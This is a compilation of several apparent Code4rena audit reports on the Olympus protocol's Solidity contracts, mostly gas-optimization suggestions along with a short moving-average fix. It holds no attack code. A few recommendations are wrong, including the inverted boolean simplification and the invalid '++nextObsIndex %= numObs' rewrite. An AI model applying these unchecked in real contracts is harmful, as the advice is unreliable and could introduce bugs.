https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized(); -       return _movingAverage; +       return _movingAverage / numObservations;     } ```  
## G001 `++I` COSTS LESS GAS COMPARED TO `I++` OR `I += 1` (SAME FOR `--I` VS `I--` OR `I -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  [https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488)  ```solidity decimals++; ```  # ****G002 - Cache Array Length Outside of Loop****  ### **Description**  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  [https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278)  ```solidity for (uint256 step; step < instructions.length; ) { ```  Background info  [https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36](https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36)  
**Pre-incrementing is cheaper than post-incrementing** Consider replacing e.g. `i++` with `++i`.  Instances:  KernelUtils.sol: [49](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L49) [64](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L64)  &nbsp;  **Function not called by the contract can be `external` instead of `public`**  Instances: Kernel.sol: [95](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L95) [100](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L100) [439](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L439) [451](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L451) TRSRY.sol: [47](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L47) [79](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L79) MINTR.sol: [20](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L20) [25](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L25) [33](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L33) [37](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L37) RANGE.sol: [110](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L110) [115](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L115) [219](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L219) PRICE.sol: [108](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L108) [113](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L113) VOTES.sol: [22](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L22) [27](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L27) [45](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L45) [55](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L55) INSTR.sol:  [23](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L23) [28](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L28) [37](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L37) Governance.sol: [145](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145) [151](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L151)  &nbsp;  **Pre-compute `.length` before repeated usage, especially in loops**  Instances: [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278)  &nbsp;  **`observations.length` is already computed in `numObservations`** `uint256 numObs = observations.length;`can be changed into `uint256 numObs = numObservations;` as suggested by its preceding comment, because its length is already calculated during construction. [PRICE.sol#L212](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L212)   
# Table of contents  - **[[0x0] Disclaimer](#0x0)** - **[[G-01] Try ++i instead of i++](G-01)** - **[[G-02] Consider `a = a + b` instead of `a += b`](G-02)** - **[[G-03] Consider marking onlyOwner functions as payable](G-03)** - **[[G-04] Use binary shifting instead of `a / 2^x, x > 0`](G-04)** - **[[G-05] Cache state variables, `MLOAD` << `SLOAD`](G-05)** - **[[G-06] Add `require()` before some computations, if it makes sense](G-06)** - **[[G-07] `Internal` functions can be inlined](G-07)** - **[[G-08] Use `private/internal` for `constants/immutable` variables instead of `public`](G-08)** - **[[G-09] Use const values instead of `type(uint256).max`](G-09)** - **[[G-10] Mark functions as `external` instead of `public`, if there are no internal calls](G-10)** - **[[G-11] Use `calldataload` instead of `mload`](G-11)** - **[[G-12] Define state variables as `immutable/const`](G-12)   ## Disclaimer<a name="0x0"></a>  - Please, consider everything described below as a general recommendation. These notes will represent potential possibilities to optimize gas consumption. It's okay, if something is not suitable in your case. Just let me know the reason in the comments section. Enjoy!  ## **[G-01] Try ++i instead of i++**<a name="G-01"></a>  ### ***Description:***    - In case of `i++`, the compiler has to to create a temp variable to return `i` (if there's a need) and then `i` gets incremented.     - In case of `++i`, the compiler just simply returns already incremented value.  ### ***All occurances:***    - Contracts:        ```Solidity       file: src/utils/KernelUtils.sol       ...............................                // Lines: [63-63]           unchecked {               i++;           }          // Lines: [58-60]           unchecked {               i++;           }     ```  ## **[G-02] Consider `a = a + b` instead of `a += b`**<a name="G-02"></a>  ### ***Description:***  - It has an impact on the deployment cost and the cost for distinct transaction as well.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/PRICE.sol        ...............................                // Lines: [136-136]             _movingAverage += (currentPrice - earliestPrice) / numObs;          // Lines: [138-138]             _movingAverage -= (earliestPrice - currentPrice) / numObs;           // Lines: [222-222]             total += startObservations_[i];        file: src/modules/TRSRY.sol        ...............................          // Lines: [96-97]             reserveDebt[token_][msg.sender] += amount_;             totalDebt[token_] += amount_;          // Lines: [131-131]             if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;          // Lines: [115-116]             reserveDebt[token_][msg.sender] -= received;             totalDebt[token_] -= received;          // Lines: [132-132]             else totalDebt[token_] -= oldDebt - amount_;        file: src/modules/VOTES.sol        ...............................          // Lines: [58-58]             balanceOf[to_] += amount_;          // Lines: [56-56]             balanceOf[from_] -= amount_;        file: src/policies/BondCallback.sol        ...............................          // Lines: [143-144]             _amountsPerMarket[id_][0] += inputAmount_;             _amountsPerMarket[id_][1] += outputAmount_;        file: src/policies/Governance.sol        ...............................          // Lines: [194-194]             totalEndorsementsForProposal[proposalId_] -= previousEndorsement;          // Lines: [198-198]             totalEndorsementsForProposal[proposalId_] += userVotes;          // Lines: [251-255]             if (for_) {                 yesVotesForProposal[activeProposal.proposalId] += userVotes;             } else {                 noVotesForProposal[activeProposal.proposalId] += userVotes;             }        file:  src/policies/Heart.sol       ...............................          // Lines: [103-103]             lastBeat += frequency();          // Lines: [138-138]         // Lines: [138-138]      ```  ## **[G-03] Consider marking onlyOwner functions as payable**<a name="G-03"></a>  ### ***Description:***  - This one is a bit questionable, but you can try that out. So, the compiler adds some extra conditions in case of non-payable, but we know that `onlyOwner` modifier will be reverted, if the user invoke following methods.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/Kernel.sol       ...............................                // Lines: [76-78]             function changeKernel(Kernel newKernel_) external onlyKernel {                 kernel = newKernel_;             }          // Lines: [126-128]             function setActiveStatus(bool activate_) external onlyKernel {                 isActive = activate_;             }          // Lines: [439-448]             function grantRole(Role role_, address addr_) public onlyAdmin {}          // Lines: [451-460]             function revokeRole(Role role_, address addr_) public onlyAdmin {}          // Lines: [235-260]             function revokeRole(Role role_, address addr_) public onlyAdmin {}        file: src/policies/BondCallback.sol        ...............................          // Lines: [61-76]             function requestPermissions()                 external                 view                 override                 onlyKernel                 returns (Permissions[] memory requests)             {}        file: src/policies/Governance.sol        ...............................          // Lines: [61-76]             function requestPermissions()                 external                 view                 override                 onlyKernel                 returns (Permissions[] memory requests)             {}         ```  ## **[G-04] Use binary shifting instead of `a / 2^x, x > 0` or `a * 2^x, x > 0`**<a name="G-04"></a>  ### ***Description:***  - It's also pretty impactful one, especially in loops.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/policies/Operator.sol       ...............................                // Lines: [372-372]           int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);          // Lines: [427-427]           int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);          // Lines: [419-420]           uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;           uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;        ```  ## **[G-05] Cache state variables, `MLOAD` << `SLOAD`**<a name="G-05"></a>  ### ***Description:***  - `MLOAD` costs only 3 units of gas, `SLOAD`(warm access) is about 100 units. Therefore, cache, when it's possible.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/policies/Governance.sol        ...............................          // Lines: [240-262]           // Comment: it is possible to cache `activeProposal.proposalId` in order to get MLOAD instead of warm access per each invoking.                    function vote(bool for_) external {                   uint256 userVotes = VOTES.balanceOf(msg.sender);                    if (activeProposal.proposalId == 0) {                       revert NoActiveProposalDetected();                   }                    if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {                       revert UserAlreadyVoted();                   }                    if (for_) {                       yesVotesForProposal[activeProposal.proposalId] += userVotes;                   } else {                       noVotesForProposal[activeProposal.proposalId] += userVotes;                   }                    userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;                    VOTES.transferFrom(msg.sender, address(this), userVotes);                    emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);               }          // Lines: [265-289]           // Comment: it is possible to cache `activeProposal.proposalId` in order to get MLOAD instead of warm access per each invoking.                  function executeProposal() external {                   uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] -                       noVotesForProposal[activeProposal.proposalId];                   if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {                       revert NotEnoughVotesToExecute();                   }                    if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_TIMELOCK) {                       revert ExecutionTimelockStillActive();                   }                    Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);                    for (uint256 step; step < instructions.length; ) {                       kernel.executeAction(instructions[step].action, instructions[step].target);                       unchecked {                           ++step;                       }                   }                    emit ProposalExecuted(activeProposal.proposalId);                    // deactivate the active proposal                   activeProposal = ActivatedProposal(0, 0);               }        file:  src/modules/RANGE.sol       ...............................          // Lines: [158-178]           // Comment: here you can allocate the result of `_range.wall.low.price` computation and etc into the memory, so in event you can simply pass that precomputed value instead of taking warm access to get `_range.wal.low.price again`. The same for all computation could be done.                function updatePrices(uint256 movingAverage_) external permissioned {                   // Cache the spreads                   uint256 wallSpread = _range.wall.spread;                   uint256 cushionSpread = _range.cushion.spread;                    // Calculate new wall and cushion values from moving average and spread                   _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;                   _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE;                    _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE;                   _range.cushion.high.price =                       (movingAverage_ * (FACTOR_SCALE + cushionSpread)) /                       FACTOR_SCALE;                    emit PricesChanged(                       _range.wall.low.price,                       _range.cushion.low.price,                       _range.cushion.high.price,                       _range.wall.high.price                   );               }        file: src/modules/PRICE.sol        ...............................          // Lines: [97-100]           // Comment: Also cache computation into memory, then assign the numObservations and after that just pass this cached result into allocating array.               numObservations = uint32(movingAverageDuration_ / observationFrequency_);             observations = new uint256[](numObservations);          // Lines: [144-144]           // This line could be transformed a bit:             nextObsIndex = (nextObsIndex + 1) % numObs;              ++nextObsIndex %= numObs;           // Lines: [165-171]           // Comment: cache `observationFrequency`               if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))                   revert Price_BadFeed(address(_ohmEthPriceFeed));               ohmEthPrice = uint256(ohmEthPriceInt);                int256 reserveEthPriceInt;               (, reserveEthPriceInt, , updatedAt, ) = _reserveEthPriceFeed.latestRoundData();               if (updatedAt < block.timestamp - uint256(observationFrequency))          // Lines: [240-262]          ```  ## **[G-06] Add `require() before some computations, if it makes sense`**<a name="G-06"></a>   ### ***Description:***  - Everyting above `require()` takes some gas for execution, therefore if the statement reverts gas will not be retrieved.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/INSTR.sol        ...............................                // Lines: [48-48]           // Comment: Put right after getting length in order to avoid unnecessary cold/warm accesses in case of the failure.               if (length == 0) revert INSTR_InstructionsCannotBeEmpty();        file: src/policies/Governance.sol        ...............................         // Lines: [183-185]                if (proposalId_ == 0) {                   revert CannotEndorseNullProposal();               }      ```    ## **[G-07] `Internal` functions can be inlined**<a name="G-07"></a>  ### ***Description:***  - It takes some extra `JUMP`s which costs around 40-50 gas uints. In loops it will save significant amount of gas.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/policies/Operator.sol       ...............................                // Lines: [643-643]           function _updateRangePrices() internal {}          // Lines: [634-634]             function _updateCapacity(bool high_, uint256 reduceBy_) internal {}      ```    ## **[G-08] Use `private/internal` for `constants/immutable` variables instead of `public`**<a name="G-08"></a>  ### ***Description:***  - Optimization comes from not creating a getter function for each `public` instance. Try to define them as private/internal if it's possible in specific case.    ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/Kernel.sol       ...............................               // Lines: [155-158]             address public executor;             address public admin;          // Lines: [165-197]             Keycode[] public allKeycodes;             mapping(Keycode => Module) public getModuleForKeycode;             mapping(Module => Keycode) public getKeycodeForModule;             mapping(Keycode => Policy[]) public moduleDependents;             mapping(Keycode => mapping(Policy => uint256)) public getDependentIndex;             mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;             Policy[] public activePolicies;             mapping(Policy => uint256) public getPolicyIndex;             mapping(address => mapping(Role => bool)) public hasRole;             mapping(Role => bool) public isRole;        // Comment: I'll not include every single occurance, because the main message have been proposed.      ```    ## **[G-09] Use const values instead of `type(uint256).max`**<a name="G-09"></a>  ### ***Description:***  - Not sure about readability, but it might be tangible in loops.    ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/modules/RANGE.sol       ...............................                // Lines: [88-88]           market: type(uint256).max          // Lines: [95-95]           market: type(uint256).max           // Lines: [221-221]           if (market_ == type(uint256).max && marketCapacity_ != 0) revert RANGE_InvalidParams();          // Lines: [230-230]           if (market_ == type(uint256).max) {}        file: src/modules/TRSRY.sol        ...............................          // Lines: [147-151]             if (approval != type(uint256).max) {                 unchecked {                     withdrawApproval[withdrawer_][token_] = approval - amount_;                 }             }        file: src/policies/BondCallback.sol        ...............................          // Lines: [57-57]             ohm.safeApprove(address(MINTR), type(uint256).max);          // Lines: [95-95]             TRSRY.setApprovalFor(address(this), payoutToken, type(uint256).max);        file:  src/policies/Operator.sol       ...............................          // Lines: [167-167]             ohm.safeApprove(address(MINTR), type(uint256).max);          // Lines: [477-477]             RANGE.updateMarket(high_, type(uint256).max, 0);          // Lines: [603-603]             TRSRY.setApprovalFor(address(this), reserve, type(uint256).max);      ```  ## **[G-10] Mark functions as `external` instead of `public`, if there are no internal calls**<a name="G-10"></a>  ### ***Description:***  - Functions marked by `external` use call data to read arguments, where `public` will first allocate in local memory and then load them.    ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/INSTR.sol        ...............................          // Lines: [28-30]           function VERSION() public pure override returns (uint8 major, uint8 minor) {               return (1, 0);           }          // Lines: [37-39]           function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {               return storedInstructions[instructionsId_];           }         file: src/modules/MINTR.sol        ...............................          // Lines: [20-22]             function KEYCODE() public pure override returns (Keycode) {                 return toKeycode("MINTR");             }          // Lines: [33-39]             function mintOhm(address to_, uint256 amount_) public permissioned {                 ohm.mint(to_, amount_);             }              function burnOhm(address from_, uint256 amount_) public permissioned {                 ohm.burnFrom(from_, amount_);             }         ``` ## **[G-11] Use `calldataload` instead of `mload`**<a name="G-11"></a>  ### ***Description:***  - After Berlin hard fork, to load a non-zero byte from calldata dropped from 64 units of gas to 16 units, therefore if you do not modify args, use a calldata instead of memory. Here you need to explicitly specify `calldataload`, or replace `memory` with `calldata`. If the args are pretty huge, allocating args in memory will cost a lot.     ### ***All occurances:***  - Contracts:        ```Solidity       file: src/Kernel.sol        ...............................                // Lines: [391-395]           // Comment: Permissions[] calldata requests_ instead of allocating into the memory.              function _setPolicyPermissions(                 Policy policy_,                 Permissions[] memory requests_,                 bool grant_             ) internal {}        file: src/modules/PRICE.sol        ...............................          // Lines: [205-205]             function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_){}        file:  src/modules/RANGE.sol       ...............................          // Lines: [77-81]             constructor(                 Kernel kernel_,                 ERC20[2] memory tokens_,                 uint256[3] memory rangeParams_ // [thresholdFactor, cushionSpread, wallSpread]             ) Module(kernel_) {}          // Lines: [275-277]           // Comment: Calldata return             function range() external view returns (Range memory) {                 return _range;             }        file: src/policies/BondCallback.sol        ...............................          // Lines: [152-152]             function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {}        file: src/policies/Governance.sol        ...............................          // Lines: [159-163]             function submitProposal(                 Instruction[] calldata instructions_,                 bytes32 title_,                 string memory proposalURI_             ) external {}        file:  src/policies/Operator.sol       ...............................          // Lines: [92-98]             constructor(                 Kernel kernel_,                 IBondAuctioneer auctioneer_,                 IBondCallback callback_,                 ERC20[2] memory tokens_, // [ohm, reserve]                 uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]             ) Policy(kernel_) {}          // Lines: [793-801]             function status() external view override returns (Status memory) {                 return _status;             }              /// @inheritdoc IOperator             function config() external view override returns (Config memory) {                 return _config;             }         }        file: src/policies/PriceConfig.sol        ...............................          // Lines: [45-48]             function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)                 external                 onlyRole("price_admin")             {          // Lines: [53-53]             function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {}        ```  ## Kudos for the quality of the code! It's pretty easy to explore 
 # GAS ## Comparision with a boolean ### Summary There are a number of instances where a boolean variable/function is checked. This check can be further simplified from `variable == true` to `!variable`.  ### Github Permalink https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L205-L236 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L295-L313 ### Mitigation Simplify boolean comparisons in order to improve readility and save gas  ## Public function visibility can be made external ### Summary  Functions should have the strictest visibility possible. Public functions may lead to more gas usage by forcing the copy of their parameters to memory from calldata. ### Details  If a function is never called from the contract it should be marked as external. This will save gas. ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L215-L235 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L33-L35 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L37-L39 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L28-L30 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L145-L147 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L151-L153 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L37-L39 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L75-L85 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L451-L458 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L439-L448  ### Mitigation  Consider changing visibility from public to external.  ## Caching calculation result can save gas ### Summary Reading from state is an expensive operation, it should be avoided when able to. ### Details In this context, value is already known as it is calculated in the same function, but in the emit what is emitted is not the local calculation but the state variable that stores result. ```         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         }         //@audit _movingAverage can be calculated to a local variable and then assigned to state so the local variable is read rather than the state in the emit          // Push new observation into storage and store timestamp taken at         observations[nextObsIndex] = currentPrice;         lastObservationTime = uint48(block.timestamp);         nextObsIndex = (nextObsIndex + 1) % numObs;                   emit NewObservation(block.timestamp, currentPrice, _movingAverage);     } ``` ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L134-L147  Same scenario here with all 4 variables in the emit https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L164-L177  ### Mitigation Consider a local variable for avoiding unnecessary reads.  ## Variables should be cached when used several times ### Summary Variables read more than once improves gas usage when cached into local variable ### Details In loops or state variables, this is even more gas saving  ### Github Permalinks activeProposal.proposalId https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L242-L262 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L266-L285  reward https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L112-L113  ### Mitigation Cache variables used more than one into a local variable.    ## usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead ### Summary When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  ### Details https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html  Use a larger size than downcast where needed  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L44-L59 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L89 ### Mitigation Consider using some data type that uses 32 bytes, for example uint256  ## Using bools for storage incurs overhead {  ### Summary Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  ### Details Here is one example of OpenZeppelin about this optimization https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27  Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past  ### Github Permalinks - variables https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L207 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L394 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L62 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L63 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L66 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L735 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L48  - functions/events https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L128 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAggregator.sol#L74 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L131 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L778 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L732 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L699 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L634 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L618 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L473 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L363 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L240 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L340 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L330 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L320 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L302 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L291 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L281 